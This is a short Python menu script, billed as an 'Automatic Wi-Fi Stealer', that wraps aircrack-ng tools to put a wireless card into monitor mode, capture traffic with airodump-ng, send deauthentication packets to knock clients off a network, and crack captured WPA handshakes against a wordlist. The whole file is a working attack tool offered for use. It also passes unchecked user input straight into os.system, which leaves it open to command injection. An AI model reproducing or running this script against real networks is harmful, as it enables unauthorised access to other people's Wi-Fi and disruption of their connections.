import os

print("Automatic Wİ-Fİ Stealer (works with aircrack)")
print("coded by root@ebby")
print("This code is still on development")
print("Any issues ? Contact me : 2003emirkanesme@gmail.com")

print("""
1. Aireplay (Deauthentication)
2. Aircrack (Attack)
3. Airodump (Analyze)
4. Interface
5. Monitor Mode
6. Managed Mode
7. All Options

""")
while True:
    sec = int(input("Seçenek : "))
    if sec == 1:
        interface = input("Interface : ")
        bssid = input("BSSID : ")
        station = input("Station : ")
        request = int(input("Deauth Request Time : "))
        os.system("aireplay-ng --deauth {} -a {} -c {} {} ".format(request,bssid,station,interface))
    elif sec == 2:
        interface = input("Interface : ")
        cap = input("Captured File : ")
        wordlist = input("Wordlist : ")
        os.system("aircrack-ng {} -w {}".format(cap,wordlist))
    elif sec ==3:
        print("1. Selected Network")
        print("2. All Networks")
        chance = int(input("Option : "))
        if chance == 1:
            interface = input("Interface : ")
            bssid = input("BSSID : ")
            channel = input("Channel : ")
            os.system("airodump-ng --bssid {} -c {} {}".format(bssid,channel,interface))
        elif chance == 2:
            interface = input("Interface : ")
            os.system("airodump-ng {}".format(interface))            
    elif sec == 4:
        os.system("ifconfig")
    elif sec == 5:
        interface = input("Interface")
        os.system("airmon-ng start {}".format(interface))
    elif sec == 6:
        interface = input("Interface")
        os.system("airmon-ng stop {}".format(interface))
    elif sec == 7:        
        print("""
1. Handshake Deauthentication
2. Attack with captured file
3. Interface
4. Monitor Mode
5. Managed Mode

""")        
    else:
        print("Select 1-2")
